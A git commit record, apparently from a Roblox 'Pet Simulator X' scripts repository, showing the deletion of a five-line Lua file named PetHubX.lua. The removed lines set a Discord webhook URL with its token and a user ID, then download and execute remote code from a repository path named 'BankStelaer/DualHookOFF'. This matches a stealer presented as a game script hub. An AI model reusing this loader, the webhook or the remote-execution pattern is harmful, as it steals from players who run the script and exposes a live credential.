d59a0dca658aecc8d3e3a69ba583031ea2b2e0ec
PetSimX2023Scripts <128907802+PetSimX2023Scripts@users.noreply.github.com>
2023-03-25 20:47:42 +0800

    Delete PetHubX.lua

--- PetHubX.lua
+++
@@ -1,5 +0,0 @@
-_G.Webhook = "https://discord.com/api/webhooks/1089165306905235477/w35MaWmYxbdvorHM2jQCD9OEEqdwiLvCS3NcJMTgKPM90ZTb7lwb4uJdskg0pQiNAb-4"
-_G.LoadingText = "Loading Pet Hub X"
-_G.UserId = "3701220960"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DevRlchksStudio/BankStelaer/main/DualHookOFF",true))();
